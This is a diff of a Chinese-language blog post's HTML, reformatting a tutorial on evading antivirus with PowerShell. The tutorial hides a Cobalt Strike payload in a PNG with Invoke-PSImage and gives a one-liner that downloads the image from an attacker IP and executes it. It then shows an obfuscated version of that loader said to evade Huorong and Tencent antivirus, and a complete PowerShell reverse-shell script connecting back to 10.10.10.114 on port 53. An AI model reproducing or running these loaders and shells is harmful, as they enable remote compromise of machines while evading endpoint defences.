@@ -330,214 +330,300 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <br>
-
-<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote>
-<p>Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。powershell一直都是内网渗透的大热门，微软是真正的在推行PowerShell，包括Office等更多自家软件，底层都是调用PowerShell来实现，近年来利用powershell来搞内网渗透进行横向或免杀的热度一直居高不下.</p>
-</blockquote>
-<p>powershell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework<br>的强大功能，PowerShell脚本的文本文件，其文件名需要加上扩展名“.PS1”。PowerShell需要.NET环境<br>的支持，同时支持.NET对象，其可读性、易用性居所有Shell之首。<br>PowerShell具有以下特点：</p>
-<ul>
-<li><p>在Windows 7以上的操作系统中是默认安装的。</p>
-</li>
-<li><p> PowerShell脚本可以运行在内存中，不需要写入磁盘。</p>
-</li>
-<li><p>几乎不会触发杀毒软件。</p>
-</li>
-<li><p>可以远程执行。</p>
-</li>
-<li><p>目前很多工具都是基于PowerShell开发的。</p>
-</li>
-<li><p>使得Windows的脚本攻击变得更加容易。</p>
-</li>
-<li><p>cmd.exe通常会被阻止运行，但是PowerShell不会。</p>
-</li>
-<li><p>可以用来管理活动目录。</p>
-</li>
-</ul>
-<h3 id="powershell的执行策略问题"><a href="#powershell的执行策略问题" class="headerlink" title="powershell的执行策略问题"></a>powershell的执行策略问题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  Unrestricted 权限最高，可以不受限制执行任意脚本</span><br><span class="line">  Restricted 默认策略，不允许任意脚本的执行</span><br><span class="line">  AllSigned 所有脚本必须经过签名运行</span><br><span class="line">  RemoteSigned 本地脚本无限制，但是对来自网络的脚本必须经过签名</span><br><span class="line">  Bypass 没有任何限制和提示</span><br><span class="line">  Undefined 没有设置脚本的策略</span><br><span class="line">查看powershell的默认策略：Get-ExecutionPolicy </span><br></pre></td></tr></table></figure>
-
-<p>但是在实战中 去修改powershell的执行策略并不太实用，动作太大容易被杀软发现 现在360(win7测试下)也开始禁止调用powershell了…(win7测试下360会拦截powershel 但是在win10下就没…..)</p>
-<h3 id="Invoke-PSimage图片混淆powershell代码"><a href="#Invoke-PSimage图片混淆powershell代码" class="headerlink" title="Invoke-PSimage图片混淆powershell代码"></a>Invoke-PSimage图片混淆powershell代码</h3><p>参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/Hungchuiho/article/details/121436429">https://blog.csdn.net/Hungchuiho/article/details/121436429</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/peewpw/Invoke-PSImage">https://github.com/peewpw/Invoke-PSImage</a></p>
+        <p><br></p>
+<h3 id="简介">简介</h3>
 <blockquote>
-<p>以 PNG 文件的像素对 PowerShell 脚本进行编码，并生成要执行的单行线<br>Invoke-PSImage 采用 PowerShell 脚本，并将脚本的字节编码为 PNG 图像的像素。它生成一个单行线，用于从 Web 的文件执行。<br>它可以仅使用有效负载数据创建新图像，也可以将有效负载嵌入到现有图像的最低有效字节中，使其看起来像实际图片。图像保存为 PNG，并且可以无损压缩，而不会影响执行有效负载的能力，因为数据存储在颜色本身中。创建新映像时，普通的 PowerShell 脚本实际上会显著压缩，通常会生成文件大小约为原始脚本的 50% 的 png。<br>使用嵌入方法时，每个像素中 2 个颜色值中最低有效 4 位用于保存有效负载。图像质量将因此受到影响，但它看起来仍然不错。它可以接受大多数图像类型作为输入，但输出将始终为PNG，因为它需要是无损的。图像的每个像素用于容纳一个字节的脚本，因此您需要一个像素至少与脚本中的字节数一样多的图像。这相当容易 - 例如，Invoke-Mimikatz适合1920x1200的图像。</p>
+<p>Windows PowerShell
+是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET
+Framework的强大功能。powershell一直都是内网渗透的大热门，微软是真正的在推行PowerShell，包括Office等更多自家软件，底层都是调用PowerShell来实现，近年来利用powershell来搞内网渗透进行横向或免杀的热度一直居高不下.</p>
+</blockquote>
+<p>powershell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用
+.NET Framework
+的强大功能，PowerShell脚本的文本文件，其文件名需要加上扩展名“.PS1”。PowerShell需要.NET环境
+的支持，同时支持.NET对象，其可读性、易用性居所有Shell之首。
+PowerShell具有以下特点：</p>
+<ul>
+<li><p>在Windows 7以上的操作系统中是默认安装的。</p></li>
+<li><p>PowerShell脚本可以运行在内存中，不需要写入磁盘。</p></li>
+<li><p>几乎不会触发杀毒软件。</p></li>
+<li><p>可以远程执行。</p></li>
+<li><p>目前很多工具都是基于PowerShell开发的。</p></li>
+<li><p>使得Windows的脚本攻击变得更加容易。</p></li>
+<li><p>cmd.exe通常会被阻止运行，但是PowerShell不会。</p></li>
+<li><p>可以用来管理活动目录。</p></li>
+</ul>
+<h3 id="powershell的执行策略问题">powershell的执行策略问题</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  Unrestricted 权限最高，可以不受限制执行任意脚本</span><br><span class="line">  Restricted 默认策略，不允许任意脚本的执行</span><br><span class="line">  AllSigned 所有脚本必须经过签名运行</span><br><span class="line">  RemoteSigned 本地脚本无限制，但是对来自网络的脚本必须经过签名</span><br><span class="line">  Bypass 没有任何限制和提示</span><br><span class="line">  Undefined 没有设置脚本的策略</span><br><span class="line">查看powershell的默认策略：Get-ExecutionPolicy </span><br></pre></td></tr></table></figure>
+<p>但是在实战中
+去修改powershell的执行策略并不太实用，动作太大容易被杀软发现
+现在360(win7测试下)也开始禁止调用powershell了...(win7测试下360会拦截powershel
+但是在win10下就没.....)</p>
+<h3 id="invoke-psimage图片混淆powershell代码">Invoke-PSimage图片混淆powershell代码</h3>
+<p>参考 https://blog.csdn.net/Hungchuiho/article/details/121436429</p>
+<p>https://github.com/peewpw/Invoke-PSImage</p>
+<blockquote>
+<p>以 PNG 文件的像素对 PowerShell 脚本进行编码，并生成要执行的单行线
+Invoke-PSImage 采用 PowerShell 脚本，并将脚本的字节编码为 PNG
+图像的像素。它生成一个单行线，用于从 Web 的文件执行。
+它可以仅使用有效负载数据创建新图像，也可以将有效负载嵌入到现有图像的最低有效字节中，使其看起来像实际图片。图像保存为
+PNG，并且可以无损压缩，而不会影响执行有效负载的能力，因为数据存储在颜色本身中。创建新映像时，普通的
+PowerShell 脚本实际上会显著压缩，通常会生成文件大小约为原始脚本的 50% 的
+png。 使用嵌入方法时，每个像素中 2 个颜色值中最低有效 4
+位用于保存有效负载。图像质量将因此受到影响，但它看起来仍然不错。它可以接受大多数图像类型作为输入，但输出将始终为PNG，因为它需要是无损的。图像的每个像素用于容纳一个字节的脚本，因此您需要一个像素至少与脚本中的字节数一样多的图像。这相当容易
+- 例如，Invoke-Mimikatz适合1920x1200的图像。</p>
 </blockquote>
 <p>先找一张高像素的123.jpg图片 方便后续写入shellcode</p>
-<p><img src="/posts/adb63639/1.png" alt="截图"></p>
-<br>
-
-<p>在CS中生成一个powershell的payload </p>
+<figure>
+<img src="/posts/adb63639/1.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<p>在CS中生成一个powershell的payload</p>
 <p>在cmd下执行以下命令即可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">Invoke-PSImage -Script .\payload.ps1 -Image .\123.jpg -Out 456.jpg -Web</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/adb63639/2.png" alt="截图"></p>
+<figure>
+<img src="/posts/adb63639/2.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>在import-module时 要关闭杀软 不然会出现拒绝</p>
-<p><img src="/posts/adb63639/3.png" alt="截图"></p>
+<figure>
+<img src="/posts/adb63639/3.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>然后会在当前目录下生成 456.jpg</p>
-<p><img src="/posts/adb63639/4.png" alt="截图"></p>
+<figure>
+<img src="/posts/adb63639/4.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>然后再powershell中会生成一段ps1代码 复制报存到shell.ps1</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>;<span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://example.com/456.jpg&quot;</span>));<span class="variable">$o</span>=a Byte[] <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|%&#123;<span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*<span class="number">2560</span>+<span class="variable">$x</span>]=([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;<span class="built_in">IEX</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..3534</span>]))</span><br><span class="line"><span class="built_in">PS</span> C:\Users\guoyo\Desktop\powershell_bypass学习\<span class="built_in">Invoke-PSImage</span><span class="literal">-master</span>&gt;</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>打开CS 使用文件下载模块去下载生成的456.jpg 点击”Launch”会生成一个url</p>
-<p><img src="/posts/adb63639/5.png" alt="截图"></p>
-<p><img src="/posts/adb63639/6.png" alt="截图"></p>
+<p><br></p>
+<p>打开CS 使用文件下载模块去下载生成的456.jpg
+点击"Launch"会生成一个url</p>
+<figure>
+<img src="/posts/adb63639/5.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<figure>
+<img src="/posts/adb63639/6.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p><code>http://10.10.10.114:80/456.jpg</code></p>
 <p>然后将<code>shell.ps1</code>url修改为CS生成的链接</p>
-<p><img src="/posts/adb63639/7.png" alt="截图"></p>
+<figure>
+<img src="/posts/adb63639/7.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>改为ps1文件 shell.ps1</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>;<span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://10.10.10.114:80/456.jpg&quot;</span>));<span class="variable">$o</span>=a Byte[] <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|%&#123;<span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*<span class="number">2560</span>+<span class="variable">$x</span>]=([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;<span class="built_in">IEX</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..3534</span>]))</span><br></pre></td></tr></table></figure>
-
-<p>在本地火绒机器上运行便可成功上线…但是静态查杀shell.ps1会被杀掉，所以可以先进行powershell混淆</p>
-<p><img src="/posts/adb63639/8.png" alt="截图"></p>
-<p><img src="/posts/adb63639/9.png" alt="截图"></p>
+<p>在本地火绒机器上运行便可成功上线...但是静态查杀shell.ps1会被杀掉，所以可以先进行powershell混淆</p>
+<figure>
+<img src="/posts/adb63639/8.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<figure>
+<img src="/posts/adb63639/9.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>腾讯电脑管家查不出，也可以直接上线</p>
-<h3 id="Invoke-Obfuscation混淆"><a href="#Invoke-Obfuscation混淆" class="headerlink" title="Invoke Obfuscation混淆"></a>Invoke Obfuscation混淆</h3><p>powershell的免杀⽅法有很多，对代码进⾏编码是最常⻅的⼀种，这⾥介绍⼀个专⻔⽤来对powershell<br>进⾏编码免杀的框架Invoke Obfuscation，这也是著名的APT32组织海莲花常⽤的⼀个⼯具。<br>该工具可以对powershell代码进行 ASCII/hex/octal/binary甚至SecureString进行加密混淆</p>
-<p>使用Invoke Obfuscation对powerhsell进行混淆 将shell.ps1放到该目录下</p>
+<h3 id="invoke-obfuscation混淆">Invoke Obfuscation混淆</h3>
+<p>powershell的免杀⽅法有很多，对代码进⾏编码是最常⻅的⼀种，这⾥介绍⼀个专⻔⽤来对powershell
+进⾏编码免杀的框架Invoke
+Obfuscation，这也是著名的APT32组织海莲花常⽤的⼀个⼯具。
+该工具可以对powershell代码进行
+ASCII/hex/octal/binary甚至SecureString进行加密混淆</p>
+<p>使用Invoke Obfuscation对powerhsell进行混淆
+将shell.ps1放到该目录下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">Import-Moudle .\Invoke-Obfuscation.psd1</span><br><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure>
-
 <p>shell2.ps1</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="number">3</span>`7j&#125;=  [<span class="type">typE</span>](<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-F</span><span class="string">&#x27;mat&#x27;</span>,<span class="string">&#x27;H&#x27;</span>)  ; <span class="variable">$</span>&#123;K8`ZR2J&#125; = [<span class="type">tYPE</span>](<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;6&#125;&#123;4&#125;&#123;3&#125;&#123;5&#125;&#123;1&#125;&quot;</span> <span class="operator">-F</span> <span class="string">&#x27;Syste&#x27;</span>,<span class="string">&#x27;nG&#x27;</span>,<span class="string">&#x27;m.&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;t.e&#x27;</span>,<span class="string">&#x27;coDI&#x27;</span>,<span class="string">&#x27;TEX&#x27;</span>); &amp;(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;al&#x27;</span>,<span class="string">&#x27;s&#x27;</span>) (<span class="string">&#x27;a&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;New-O&#x27;</span>,<span class="string">&#x27;bj&#x27;</span>,<span class="string">&#x27;ect&#x27;</span>);.(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;pe&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;dd-Ty&#x27;</span>) <span class="literal">-A</span> (<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;Drawing&#x27;</span>,<span class="string">&#x27;em.&#x27;</span>,<span class="string">&#x27;yst&#x27;</span>);<span class="variable">$</span>&#123;g&#125;=&amp;(<span class="string">&#x27;a&#x27;</span>) (<span class="string">&quot;&#123;1&#125;&#123;3&#125;&#123;0&#125;&#123;2&#125;&#123;4&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;aw&#x27;</span>,<span class="string">&#x27;Syst&#x27;</span>,<span class="string">&#x27;ing.Bitma&#x27;</span>,<span class="string">&#x27;em.Dr&#x27;</span>,<span class="string">&#x27;p&#x27;</span>)((&amp;(<span class="string">&#x27;a&#x27;</span>) (<span class="string">&quot;&#123;3&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;nt&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;WebCli&#x27;</span>,<span class="string">&#x27;Net.&#x27;</span>)).(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;penRea&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;O&#x27;</span>).Invoke((<span class="string">&quot;&#123;1&#125;&#123;7&#125;&#123;5&#125;&#123;3&#125;&#123;8&#125;&#123;4&#125;&#123;0&#125;&#123;2&#125;&#123;6&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;http://1&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;4:80&#x27;</span>,<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;.10.10.11&#x27;</span>,<span class="string">&#x27;pg&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;/4&#x27;</span>)));<span class="variable">$</span>&#123;O&#125;=.(<span class="string">&#x27;a&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;By&#x27;</span>,<span class="string">&#x27;te[]&#x27;</span>) <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|.(<span class="string">&#x27;%&#x27;</span>)&#123;<span class="keyword">foreach</span>(<span class="variable">$</span>&#123;x&#125; <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$</span>&#123;p&#125;=<span class="variable">$</span>&#123;g&#125;.(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;Ge&#x27;</span>,<span class="string">&#x27;Pixel&#x27;</span>,<span class="string">&#x27;t&#x27;</span>).Invoke(<span class="variable">$</span>&#123;x&#125;,<span class="variable">$</span>&#123;_&#125;);<span class="variable">$</span>&#123;o&#125;[<span class="variable">$</span>&#123;<span class="type">_</span>&#125;*<span class="number">2560</span>+<span class="variable">$</span>&#123;<span class="type">x</span>&#125;]=( (ChIlDiTeM  (<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;3&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;VaRia&#x27;</span>,<span class="string">&#x27;e:37J&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;L&#x27;</span>) ).<span class="string">&quot;vaL`Ue&quot;</span>::(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;Fl&#x27;</span>,<span class="string">&#x27;oor&#x27;</span>).Invoke((<span class="variable">$</span>&#123;P&#125;.<span class="string">&quot;B&quot;</span><span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$</span>&#123;P&#125;.<span class="string">&quot;g&quot;</span> <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;EX&#x27;</span>)(  ( <span class="built_in">gci</span>  (<span class="string">&#x27;V&#x27;</span>+<span class="string">&#x27;ar&#x27;</span>+<span class="string">&#x27;Iab&#x27;</span>+<span class="string">&#x27;LE:k8ZR&#x27;</span>+<span class="string">&#x27;2J&#x27;</span>) ).<span class="string">&quot;VA`LUe&quot;</span>::<span class="string">&quot;ASC`iI&quot;</span>.<span class="string">&quot;GEt`s`TRi`Ng&quot;</span>(<span class="variable">$</span>&#123;o&#125;[<span class="number">0</span><span class="type">..3534</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p> 静态查杀效果</p>
+<p>静态查杀效果</p>
 <p>混淆前</p>
-<p><img src="/posts/adb63639/10.png" alt="截图"></p>
+<figure>
+<img src="/posts/adb63639/10.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>混淆后</p>
-<p><img src="/posts/adb63639/11.png" alt="截图"></p>
-<p><img src="/posts/adb63639/12.png" alt="截图"></p>
-<p><img src="/posts/adb63639/13.png" alt="截图"></p>
-<p>也可以过360的静态查杀(但是现在360禁止调用powershell 所以…)</p>
+<figure>
+<img src="/posts/adb63639/11.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<figure>
+<img src="/posts/adb63639/12.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<figure>
+<img src="/posts/adb63639/13.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p>也可以过360的静态查杀(但是现在360禁止调用powershell 所以...)</p>
 <p>上传到VT上查看混淆后的效果</p>
-<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/03e35a1c21bd99766c6f7729c59df32340b2f88ecf834236c143584fc2390d9e?nocache=1">https://www.virustotal.com/gui/file/03e35a1c21bd99766c6f7729c59df32340b2f88ecf834236c143584fc2390d9e?nocache=1</a></p>
-<p><img src="/posts/adb63639/14.png" alt="截图"></p>
+<p>https://www.virustotal.com/gui/file/03e35a1c21bd99766c6f7729c59df32340b2f88ecf834236c143584fc2390d9e?nocache=1</p>
+<figure>
+<img src="/posts/adb63639/14.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>动态查杀效果</p>
-<p><img src="/posts/adb63639/15.png" alt="截图"></p>
-<p>火绒 腾讯管家都可以正常上线 不过360禁止调用powershell 没发成功利用… </p>
-<h3 id="Powershell-socket免杀"><a href="#Powershell-socket免杀" class="headerlink" title="Powershell socket免杀"></a>Powershell socket免杀</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-Variable</span> <span class="literal">-Name</span> client <span class="literal">-Value</span> (<span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.10.114&quot;</span>, <span class="number">53</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-Variable</span> <span class="literal">-Name</span> stream <span class="literal">-Value</span>(<span class="variable">$client</span>.GetStream());</span><br><span class="line"></span><br><span class="line">[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span> | % &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="built_in">Set-Variable</span> <span class="literal">-Name</span> i <span class="literal">-Value</span>(<span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length))) <span class="operator">-ne</span> <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> <span class="keyword">data</span> <span class="literal">-Value</span> ((<span class="built_in">New-Object</span> <span class="literal">-TypeNameSystem</span>.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$i</span>));</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> sendback <span class="literal">-Value</span> (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> sendback2 <span class="literal">-Value</span> (<span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> sendbyte <span class="literal">-Value</span> (([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>));</span><br><span class="line">  <span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>, <span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);</span><br><span class="line">  <span class="variable">$stream</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$client</span>.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<figure>
+<img src="/posts/adb63639/15.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p>火绒 腾讯管家都可以正常上线 不过360禁止调用powershell
+没发成功利用...</p>
+<h3 id="powershell-socket免杀">Powershell socket免杀</h3>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-Variable</span> <span class="literal">-Name</span> client <span class="literal">-Value</span> (<span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.10.114&quot;</span>, <span class="number">53</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-Variable</span> <span class="literal">-Name</span> stream <span class="literal">-Value</span>(<span class="variable">$client</span>.GetStream());</span><br><span class="line"></span><br><span class="line">[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span> | % &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="built_in">Set-Variable</span> <span class="literal">-Name</span> i <span class="literal">-Value</span>(<span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length))) <span class="operator">-ne</span> <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> <span class="keyword">data</span> <span class="literal">-Value</span> ((<span class="built_in">New-Object</span> <span class="literal">-TypeNameSystem</span>.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$i</span>));</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> sendback <span class="literal">-Value</span> (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> sendback2 <span class="literal">-Value</span> (<span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">Set-Variable</span> <span class="literal">-Name</span> sendbyte <span class="literal">-Value</span> (([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>));</span><br><span class="line">  <span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>, <span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);</span><br><span class="line">  <span class="variable">$stream</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$client</span>.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>使用Invoke Obfuscation 混淆后</p>
